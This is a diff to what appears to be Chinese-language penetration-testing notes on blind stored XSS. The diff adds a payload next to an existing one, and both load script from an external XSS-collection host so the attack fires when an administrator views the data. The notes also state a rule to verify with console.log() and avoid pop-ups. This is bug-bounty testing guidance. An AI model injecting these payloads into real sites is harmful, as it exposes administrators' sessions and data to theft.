@@ -19,7 +19,7 @@
 + 盲存储类XSS
     - payload不会在前端立即触发，而是在后台系统、管理员面板等场景下由其他用户（如管理员）触发。
     - 红线：官方推荐使用 console.log() 来验证漏洞，或者仅允许外带domain信息， ``禁止弹框`` 。
-    - payload： ``"><script src=https://me.xss.ht></script>``
+    - payload： ``"><script src=https://me.xss.ht></script>`` ， ``"><imgsrc=//me.xss.ht>``
 + APK在线分析
     - 对于apk中某些属性的页面显示，可能存在存储型xss的可能。
 + 文件上传型
